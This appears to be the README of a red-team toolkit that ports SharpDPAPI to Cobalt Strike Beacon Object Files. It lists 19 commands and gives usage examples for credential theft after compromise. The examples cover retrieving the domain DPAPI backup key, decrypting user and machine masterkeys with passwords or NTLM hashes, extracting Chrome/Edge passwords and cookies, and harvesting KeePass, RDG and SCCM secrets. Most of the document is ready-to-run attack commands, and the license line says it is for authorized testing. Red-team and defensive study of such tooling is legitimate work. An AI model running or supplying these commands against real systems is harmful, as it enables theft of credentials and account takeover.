# DPAPI_BOF

**SharpDPAPI** ported to **Cobalt Strike Beacon Object Files (BOFs)** — 19 self-contained BOFs for DPAPI credential triage, all under 48KB each.

> Based on [GhostPack/SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by @harmj0y

---

## Quick Start

### Build

```bash
# Requires mingw-w64
sudo apt install mingw-w64

# Build all BOFs
make

# Clean
make clean
```

All compiled BOFs land in `dist/` as `.o` files. Each is self-contained — no separate DLLs or dependencies needed at runtime.

### Load in Cobalt Strike

```
Script Manager → Load → dpapi.cna
```

This registers all commands. BOFs are loaded from the `dist/` directory relative to the script.

---

## Commands

### User-Level (no admin required)

| Command | Description |
|---------|-------------|
| `masterkeys` | Triage user DPAPI masterkeys |
| `credentials` | Triage user credential files |
| `vaults` | Triage user vault files |
| `certificates` | Triage DPAPI-protected certificate private keys |
| `triage` | Full user triage (masterkeys + creds + vaults + certs) |
| `blob` | Describe/decrypt a raw DPAPI blob |
| `backupkey` | Retrieve domain DPAPI backup key from DC |
| `rdg` | Triage RDG/RDCMan saved credentials |
| `keepass` | Triage KeePass ProtectedUserKey.bin files |
| `ps` | Decrypt PowerShell PSCredential / SecureString files |
| `search` | Search for files containing DPAPI blobs |
| `chrome_logins` | Extract Chrome/Edge saved passwords |
| `chrome_cookies` | Extract Chrome/Edge cookies |
| `chrome_statekeys` | Extract Chrome/Edge Local State AES keys |

### Machine-Level (requires admin / high integrity)

| Command | Description |
|---------|-------------|
| `machinemasterkeys` | Triage SYSTEM DPAPI masterkeys |
| `machinecredentials` | Triage SYSTEM credential files |
| `machinevaults` | Triage SYSTEM vault files |
| `machinetriage` | Full SYSTEM triage (masterkeys + creds + vaults + certs) |
| `sccm` | Triage SCCM NAA/task sequence credentials |

---

## Usage Examples

### Triage with Domain Backup Key (PVK)

```
# Get the domain backup key (run from DC or with DC access)
backupkey /server:dc01.corp.local

# Use it to decrypt all user masterkeys + credentials
masterkeys /pvk:<BASE64_PVK>
credentials /pvk:<BASE64_PVK>
vaults /pvk:<BASE64_PVK>

# Or do everything at once
triage /pvk:<BASE64_PVK>
```

### Triage with Known Password/NTLM

```
masterkeys /password:Summer2025!
masterkeys /ntlm:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4

credentials /password:Summer2025! /server:dc01.corp.local
```

### Triage with Pre-computed Masterkeys

```
# If you already have {GUID}:SHA1 pairs from a previous run
credentials /credkey:{GUID1}:{SHA1},{GUID2}:{SHA1}
vaults /credkey:{GUID1}:{SHA1}
```

### Using /rpc for Masterkey Decryption

```
# Use MS-BKRP RPC to decrypt masterkeys (requires domain user context)
masterkeys /rpc
credentials /rpc
```

### Machine Triage (Elevated)

```
# Run from high-integrity beacon
machinemasterkeys
machinecredentials
machinevaults

# Or all at once
machinetriage
```

### DPAPI Blob Decryption

```
# Describe a raw DPAPI blob
blob /target:<BASE64_BLOB>

# Decrypt using CryptUnprotectData (current user context)
blob /target:<BASE64_BLOB> /unprotect
```

### Chrome/Edge

```
# Extract the AES state key first
chrome_statekeys /pvk:<BASE64_PVK>

# Then use it to decrypt logins/cookies
chrome_logins /statekey:<HEX_KEY>
chrome_cookies /statekey:<HEX_KEY> /cookie:session /url:github.com
```

### Application-Specific

```
# RDCMan / Remote Desktop Gateway
rdg /pvk:<BASE64_PVK>

# KeePass master keys
keepass /pvk:<BASE64_PVK>

# PowerShell SecureString / PSCredential
ps /target:C:\path\to\cred.xml /unprotect

# SCCM credentials (requires admin)
sccm
```

---

## Common Arguments

| Argument | Description |
|----------|-------------|
| `/pvk:<BASE64>` | Domain DPAPI backup key (base64-encoded PVK) |
| `/password:<PASS>` | User's plaintext password |
| `/ntlm:<HASH>` | User's NTLM hash |
| `/credkey:<GUID:SHA1>` | Pre-computed masterkey pairs (comma-separated) |
| `/server:<DC>` | Target domain controller |
| `/target:<PATH>` | Specific file or directory to triage |
| `/rpc` | Use MS-BKRP RPC for masterkey decryption |
| `/unprotect` | Use CryptUnprotectData (current user context) |
| `/showall` | Show all results including ones without private keys |
| `/hashes` | Output masterkey hashes (for offline cracking) |
| `/statekey:<HEX>` | Chrome AES state key (hex-encoded) |
| `/cookie:<REGEX>` | Filter cookies by name pattern |
| `/url:<REGEX>` | Filter cookies by URL pattern |

---

## Project Structure

```
├── dpapi.cna              # Aggressor script (load this)
├── Makefile               # Cross-compilation build
├── include/
│   ├── beacon.h           # CS BOF API
│   ├── bofdefs.h          # Win32 DFR macros
│   ├── crypto.h           # BCrypt crypto wrappers
│   ├── dpapi_common.h     # Core DPAPI types & functions
│   ├── helpers.h          # Utility functions
│   ├── interop.h          # Win32 interop (DC lookup etc.)
│   ├── lsadump.h          # LSA secret extraction
│   └── triage.h           # File system triage operations
├── src/
│   ├── common/            # Shared library (linked into every BOF)
│   │   ├── crypto.c
│   │   ├── dpapi.c
│   │   ├── helpers.c
│   │   ├── interop.c
│   │   ├── lsadump.c
│   │   └── triage.c
│   └── bofs/              # Individual BOF entry points
│       ├── masterkeys.c
│       ├── credentials.c
│       ├── vaults.c
│       ├── blob.c
│       ├── backupkey.c
│       ├── certificates.c
│       ├── rdg.c
│       ├── keepass.c
│       ├── ps.c
│       ├── machinemasterkeys.c
│       ├── machinecredentials.c
│       ├── machinevaults.c
│       ├── machinetriage.c
│       ├── triage_bof.c
│       ├── search.c
│       ├── sccm.c
│       ├── chrome_logins.c
│       ├── chrome_cookies.c
│       └── chrome_statekeys.c
└── dist/                  # Compiled BOFs (after make)
```

## How It Works

Each BOF is compiled as a relocatable object file (`.o`) with all shared library code statically linked via `ld -r`. This means:

- **No runtime dependencies** — each BOF is fully self-contained
- **No CRT** — all Win32 calls use Dynamic Function Resolution (DFR)
- **Small size** — all BOFs are under 48KB (300KB CS limit)
- **Cross-compiled** — built on Linux with MinGW-w64

---

## Credits

- **SharpDPAPI** by [@harmj0y](https://github.com/harmj0y) / [GhostPack](https://github.com/GhostPack)
- DPAPI internals research by Benjamin Delpy (Mimikatz) and others

## License

This project is for authorized security testing only. Use responsibly.
